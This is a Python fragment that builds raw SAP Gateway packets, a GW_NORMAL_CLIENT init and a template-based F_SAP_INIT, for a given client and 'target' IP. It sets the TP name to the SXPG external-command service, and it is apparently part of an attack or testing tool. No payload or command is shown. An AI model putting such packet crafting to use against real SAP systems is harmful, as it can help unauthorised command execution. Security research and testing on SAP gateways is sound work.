def build_gw_init(client_ip, instance):
    """Build P1: GW_NORMAL_CLIENT (64 bytes, constructed from scratch)."""
    pkt = bytearray(64)
    pkt[0] = 0x02                                           # version
    pkt[1] = 0x03                                           # req_type = GW_NORMAL_CLIENT
    pkt[2:6] = socket.inet_aton(client_ip)                  # client IP (4 bytes)
    service = f'sapgw{instance}'.encode()[:10]
    pkt[10:10+len(service)] = service                       # service name
    pkt[20:24] = b'4103'                                    # codepage
    pkt[29] = 0x0e                                          # flags
    lu = b'sapserve'
    pkt[30:30+len(lu)] = lu
    tp = f'sapgw{instance}'.encode().ljust(16, b'\x20')
    pkt[38:54] = tp[:16]                                    # TP name
    pkt[54] = 0x06                                          # appc_header_version
    pkt[55] = 0xcb                                          # accept_info
    pkt[56:58] = b'\xff\xff'                                # idx = -1
    return bytes(pkt)


def build_sap_init(template, client_ip, target_ip, sid='A4H'):
    """Build P2: F_SAP_INIT (template-based, IP + TP-name replacement).

    sid -- SAP System ID of the target (3 chars).  Used to replace the TP name
           'A4H-SXPG' in two locations of the template.  Since SAP SIDs are
           always 3 characters, the substitution is length-neutral.
    """
    pkt = bytearray(template)
    pkt[150:154] = socket.inet_aton(client_ip)
    ip_ascii = target_ip.encode().ljust(30, b'\x00')
    pkt[185:215] = ip_ascii[:30]
    pkt[381:385] = socket.inet_aton(target_ip)
    # Replace TP name (appears twice: offset 48 and 80).  Always length-neutral.
    new_tp = f'{sid[:3]}-SXPG'.encode('ascii')
    pkt = bytearray(bytes(pkt).replace(_OLD_P2_TP_NAME, new_tp))
    return bytes(pkt)


